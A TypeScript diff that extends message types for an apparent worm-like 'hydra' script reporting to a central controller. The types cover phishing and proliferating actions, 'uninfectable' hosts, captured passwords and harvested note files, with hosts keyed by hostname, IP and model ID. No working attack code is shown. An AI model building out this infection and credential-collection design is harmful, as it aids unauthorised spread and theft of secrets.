@@ -29,12 +29,27 @@ export type HydraAction = "none" | "phishing" | "reclaiming" | "proliferating";
 
 // Sent by the hydra script to update the main controller
 export interface HydraInstanceUpdate {
+  /*
+    Action: the 'identity' is performing some action.
+      Will also include more metadata about the server.
+
+    NoteFound: the 'identity' found a bunch of notes.
+
+    Uninfectable: the 'identity' cannot be authenticated.
+  */
+  type: "action" | "noteFound" | "uninfectable";
+
   identity: string;
-  action: HydraAction;
-  depth: number;
+  action?: HydraAction;
+  depth?: number;
   password?: string;
+
   lastUpdate: number;
 
   // filename -> content
   notesFound?: Record<string, string>;
+}
+
+export function getIdentifier(hostname: string, ip: string, modelId: string): string {
+  return `${hostname}-${ip}-${modelId}`;
 }
